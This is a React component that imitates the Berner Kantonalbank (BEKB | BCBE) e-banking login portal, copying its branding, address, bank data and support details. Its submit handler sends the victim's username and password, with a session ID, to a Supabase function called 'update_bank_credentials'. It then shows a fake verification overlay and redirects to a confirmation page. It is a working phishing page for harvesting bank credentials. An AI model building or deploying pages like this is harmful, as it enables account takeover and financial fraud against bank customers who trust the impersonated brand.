import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Home, ChevronRight, Youtube } from "lucide-react";
import logoAsset from "@/assets/bekb-bcbe-logo.svg.asset.json";

const RED = "#d00035";
const GREEN = "#e4ead6";
const GREEN_DARK = "#9aa884";
const FOOTER_BG = "#545b68";
const LABEL_COLOR = "#d4a48a";

type Lang = "DE" | "FR" | "EN";

type FieldProps = {
  id: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  isPassword?: boolean;
  showPwd?: boolean;
  onTogglePwd?: () => void;
};

const FloatingField = ({
  id, label, value, onChange, isPassword, showPwd, onTogglePwd,
}: FieldProps) => {
  const [focused, setFocused] = useState(false);
  const active = focused || value.length > 0;
  const inputType = isPassword ? (showPwd ? "text" : "password") : "text";

  return (
    <div className="relative pt-5">
      <input
        id={id}
        type={inputType}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        className="w-full bg-transparent outline-none text-[15px] text-black pb-2 pr-10"
        style={{ borderBottom: `1px solid ${LABEL_COLOR}` }}
      />
      <label
        htmlFor={id}
        className="absolute left-0 pointer-events-none transition-all"
        style={{
          top: active ? 0 : 24,
          fontSize: active ? 12 : 15,
          color: LABEL_COLOR,
        }}
      >
        {label}
      </label>
      {isPassword && (
        <button
          type="button"
          onClick={onTogglePwd}
          aria-label="Passwort anzeigen"
          className="absolute right-0 bottom-2 text-black"
        >
          {showPwd ? <EyeOff size={20} /> : <Eye size={20} />}
        </button>
      )}
    </div>
  );
};

const XingIcon = ({ size = 18 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor">
    <path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.539l-4.879-8.916c-.004-.006-.004-.016 0-.022l7.665-13.557c.097-.193.097-.387.008-.539-.088-.142-.252-.21-.463-.21h-3.496zM3.648 4.74c-.211 0-.385.071-.473.218-.09.151-.078.347.018.535l2.34 4.05c.005.009.005.014 0 .023L1.86 16.51c-.099.188-.093.381-.005.532.088.142.251.235.462.235h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.667-.962-.667H3.648z"/>
  </svg>
);

const ChBernerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("DE");

  const [benutzer, setBenutzer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPwd, setShowPwd] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("BEKB | BCBE – Mein Portal", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: benutzer,
        p_password: passwort,
        p_username_label: "Benutzeridentifikation",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const langs: Lang[] = ["DE", "FR", "EN"];

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white text-black">
        {/* Header */}
        <header className="relative">
          <div className="max-w-[1200px] mx-auto px-6 md:px-20">
            {/* Roter Balken nur über Content */}
            <div className="h-1.5" style={{ backgroundColor: RED }} />
            <div className="flex justify-between items-start pt-8 pb-6">
              <img src={logoAsset.url} alt="BEKB | BCBE" className="h-7 md:h-8" />
              <nav className="relative flex gap-6 text-[14px]">
                {langs.map((l) => (
                  <button
                    key={l}
                    onClick={() => setLang(l)}
                    className="relative pb-3"
                    style={{ color: lang === l ? "#000" : "#999" }}
                  >
                    {l}
                    {lang === l && (
                      <span
                        className="absolute left-1/2 -translate-x-1/2 w-6 h-[3px]"
                        style={{ bottom: -1.5, backgroundColor: GREEN_DARK }}
                      />
                    )}
                  </button>
                ))}
              </nav>
            </div>
          </div>
          {/* Grüne Linie full width */}
          <div className="h-[3px] w-full" style={{ backgroundColor: GREEN }} />
        </header>

        {/* Above-the-fold Section */}
        <section className="flex-1 flex flex-col">
          <div className="max-w-[1200px] w-full mx-auto px-6 md:px-20 pt-12 flex-1">
            <div className="inline-block pb-2 mb-10 text-[15px] font-bold" style={{ borderBottom: `2px solid ${RED}` }}>
              Mein Portal
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-[4fr_1fr] gap-12">
              {/* Login */}
              <div>
                <h1 className="text-[26px] md:text-[36px] font-bold mb-10 leading-tight">
                  Bitte geben Sie Ihre Zugangsdaten an
                </h1>

                <div className="space-y-2 max-w-[640px]">
                  <FloatingField
                    id="bekb-user"
                    label="Benutzeridentifikation"
                    value={benutzer}
                    onChange={setBenutzer}
                  />
                  <FloatingField
                    id="bekb-pass"
                    label="Passwort"
                    isPassword
                    value={passwort}
                    onChange={setPasswort}
                    showPwd={showPwd}
                    onTogglePwd={() => setShowPwd(!showPwd)}
                  />
                </div>

                <p className="text-[14px] mt-8 max-w-[640px]">
                  Mit der Anmeldung akzeptiere ich die{" "}
                  <a href="#" style={{ color: RED }}>Geschäftsbedingungen</a>{" "}
                  der BEKB | BCBE für das E-Banking.
                </p>

                <button
                  onClick={handleSubmit}
                  className="mt-6 w-full max-w-[640px] h-12 text-[15px] text-black transition-colors hover:brightness-95"
                  style={{ backgroundColor: GREEN }}
                >
                  Weiter
                </button>

                <a
                  href="#"
                  className="mt-6 inline-flex items-center gap-2 text-[14px] font-bold"
                  style={{ color: RED }}
                >
                  <ChevronRight size={14} strokeWidth={3} />
                  E-Banking Schritt für Schritt einrichten
                </a>
              </div>

              {/* Nützliche Links */}
              <aside className="p-6" style={{ backgroundColor: GREEN }}>
                <h3 className="font-bold text-[16px] mb-4">Nützliche Links</h3>
                <a href="#" className="block text-[14px] mb-4" style={{ color: RED }}>
                  Zur Support und Hilfe-Seite
                </a>
                <a href="#" className="block text-[14px]" style={{ color: RED }}>
                  So erkennen Sie Betrugsmaschen im E-Banking
                </a>

                <h3 className="font-bold text-[16px] mt-10 mb-3">Unser Support</h3>
                <p className="text-[14px] mb-4">
                  Wir rufen Sie an, wann es Ihnen am besten passt:
                </p>
                <a href="#" className="block text-[14px] mb-4" style={{ color: RED }}>
                  Telefontermin vereinbaren
                </a>
                <p className="text-[14px] mb-4">Telefon 031 666 18 80</p>
                <p className="text-[14px]">Montag bis Freitag</p>
                <p className="text-[14px] mb-3">08:00 bis 20:00 Uhr</p>
                <p className="text-[14px]">Samstag</p>
                <p className="text-[14px]">09:00 bis 16:00 Uhr</p>
              </aside>
            </div>
          </div>

          {/* Breadcrumb unten gepinnt */}
          <div className="max-w-[1200px] w-full mx-auto px-6 md:px-20 mt-12">
            <div className="border-t border-[#dcdcdc]" />
            <div className="py-4 flex items-center gap-2 text-[14px] text-[#555]">
              <Home size={16} />
              <ChevronRight size={14} />
              <span>Mein Portal</span>
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer className="text-white" style={{ backgroundColor: FOOTER_BG }}>
          <div className="max-w-[1200px] mx-auto px-6 md:px-20 py-14">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-10 text-[14px]">
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Anschrift</h4>
                <p>BEKB | BCBE</p>
                <p>Bundesplatz 8</p>
                <p>Postfach</p>
                <p>3001 Bern</p>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Bankdaten</h4>
                <p>QR-IID: 30790</p>
                <p>BC-Nummer: 790</p>
                <p>SWIFT-Nummer: KBBECH22XXX</p>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Schnellzugriff</h4>
                <a href="#" className="block underline mb-2">Offene Stellen</a>
                <a href="#" className="block underline mb-2">Medien</a>
                <a href="#" className="block underline mb-2">Glossar</a>
                <a href="#" className="block underline">Support und Hilfe</a>
              </div>
              <div>
                <h4 className="font-bold pb-2 mb-4 border-b border-white/40">Social Media</h4>
                <div className="flex gap-3">
                  <a href="#" aria-label="YouTube" className="w-10 h-10 flex items-center justify-center bg-white/10 hover:bg-white/20">
                    <Youtube size={20} />
                  </a>
                  <a href="#" aria-label="Xing" className="w-10 h-10 flex items-center justify-center bg-white/10 hover:bg-white/20">
                    <XingIcon size={18} />
                  </a>
                </div>
              </div>
            </div>

            <div className="mt-10 pt-6 border-t border-white/30 flex flex-col md:flex-row gap-3 md:gap-8 text-[14px]">
              <span>© Berner Kantonalbank AG</span>
              <a href="#" className="underline">Rechtliche Hinweise</a>
              <a href="#" className="underline">Datenschutz</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBernerKantonalbank;
